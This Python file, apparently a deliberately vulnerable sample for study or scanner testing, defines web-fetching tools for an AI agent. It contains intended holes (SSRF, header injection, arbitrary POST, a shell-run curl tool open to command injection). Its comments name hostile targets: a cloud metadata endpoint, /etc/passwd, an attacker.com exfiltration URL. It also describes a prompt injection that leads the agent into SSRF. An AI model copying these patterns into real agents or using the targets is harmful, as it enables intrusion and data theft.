"""
Web fetching tool for AI agent.
Provenance: Common pattern in agent projects for web browsing capabilities.
Extracted and anonymized from multiple GitHub agent projects.

This tool allows an AI agent to fetch content from URLs, commonly used
for research agents, browsing agents, and RAG applications.

VULNERABILITY: No URL validation, SSRF possible.
Agent can be tricked into fetching internal URLs, metadata endpoints,
or making requests to arbitrary servers with the agent's credentials.
"""
from __future__ import annotations

from typing import Optional
from urllib.parse import urlparse


# Simulated requests import (actual import would require requests dependency)
class MockResponse:
    def __init__(self, text: str, status_code: int = 200):
        self.text = text
        self.status_code = status_code
        self.content = text.encode()


def mock_get(url: str, **kwargs) -> MockResponse:
    """Mock implementation of requests.get for demonstration."""
    return MockResponse(f"Content from {url}", 200)


# In real code: import requests
requests_get = mock_get


def tool(func):
    """Decorator to mark a function as an agent tool."""
    func.is_tool = True
    return func


@tool
def fetch_url(url: str) -> str:
    """Fetch content from a URL.

    This tool allows the agent to retrieve web content for research
    and information gathering. The URL is provided by the LLM.

    Args:
        url: The URL to fetch (from LLM output).

    Returns:
        The text content of the page (truncated).
    """
    # VULNERABILITY: No URL validation, SSRF possible
    # Agent can be tricked into fetching:
    # - http://169.254.169.254/latest/meta-data/ (AWS metadata)
    # - http://localhost:8080/admin (internal services)
    # - file:///etc/passwd (local files, depending on library)
    # - http://internal-service.local/api/secrets

    try:
        response = requests_get(url, timeout=10)
        return response.text[:5000]
    except Exception as e:
        return f"Error fetching URL: {e}"


@tool
def fetch_url_with_headers(url: str, headers: Optional[str] = None) -> str:
    """Fetch URL with custom headers.

    Args:
        url: The URL to fetch.
        headers: Optional JSON string of headers.

    Returns:
        The response content.
    """
    import json

    parsed_headers = {}
    if headers:
        try:
            parsed_headers = json.loads(headers)
        except json.JSONDecodeError:
            return "Error: Invalid headers JSON"

    # VULNERABILITY: Headers from LLM output
    # An attacker could inject auth headers to access protected resources
    # or inject headers for request smuggling

    try:
        response = requests_get(url, headers=parsed_headers, timeout=10)
        return response.text[:5000]
    except Exception as e:
        return f"Error: {e}"


@tool
def post_to_url(url: str, data: str) -> str:
    """POST data to a URL.

    Args:
        url: The URL to post to.
        data: The data to send (from LLM).

    Returns:
        The response content.
    """
    # VULNERABILITY: POST to arbitrary URLs
    # Combined with SSRF, this allows data exfiltration:
    # POST http://attacker.com/collect?data=... with sensitive data

    # In real code: requests.post(url, data=data)
    return f"Posted to {url}"


# Alternative dangerous patterns observed in the wild
@tool
def execute_curl(curl_command: str) -> str:
    """Execute a curl command (EXTREMELY DANGEROUS).

    This pattern is seen in some agents that want "full curl capabilities".
    """
    import subprocess

    # VULNERABILITY: Command injection via curl arguments
    try:
        result = subprocess.run(
            f"curl {curl_command}",
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
        )
        return result.stdout
    except Exception as e:
        return f"Error: {e}"


class WebBrowsingAgent:
    """Agent with web browsing capabilities."""

    def __init__(self):
        self.tools = {
            "fetch_url": fetch_url,
            "fetch_url_with_headers": fetch_url_with_headers,
            "post_to_url": post_to_url,
            "execute_curl": execute_curl,
        }

    def browse(self, tool_name: str, **kwargs) -> str:
        """Use a browsing tool."""
        if tool_name in self.tools:
            return self.tools[tool_name](**kwargs)
        return f"Unknown tool: {tool_name}"


if __name__ == "__main__":
    agent = WebBrowsingAgent()

    # Normal usage
    print(agent.browse("fetch_url", url="https://example.com"))

    # SSRF attack through prompt injection:
    # Agent is tricked into calling:
    # agent.browse("fetch_url", url="http://169.254.169.254/latest/meta-data/")
